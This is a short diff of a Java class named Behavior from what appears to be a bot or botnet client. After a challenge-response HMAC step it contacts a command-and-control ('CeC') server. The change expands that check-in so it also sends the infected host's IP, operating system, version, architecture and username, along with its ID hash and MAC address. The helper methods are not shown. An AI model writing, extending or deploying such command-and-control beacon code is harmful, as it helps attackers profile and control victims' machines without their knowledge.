@@ -100,8 +100,8 @@ public class Behavior {
 		if (challenge != null) {
 			String key = auth.generateStringKey(challenge.getValue2());
 			String hashMac = auth.generateHmac(challenge.getValue1(), auth.generateSecretKey(key));
-			System.out.println(hashMac);
-			String response = request.getResponseFromCeC(networkService.getIdHash(), networkService.getMac(),networkService.getCommandConquerIps().getCeCList().get(0).getValue1(), hashMac);
+			System.out.println(hashMac);				
+				String response = request.getResponseFromCeC(networkService.getIdHash(), networkService.getIp(), networkService.getMac(), networkService.getOs(), networkService.getVersionOS(), networkService.getArchOS(), networkService.getUsernameOS(), networkService.getCommandConquerIps().getCeCList().get(0).getValue1(), hashMac);
 			System.out.println("La risposta del CeC: " + response);
 		}
 		return true;
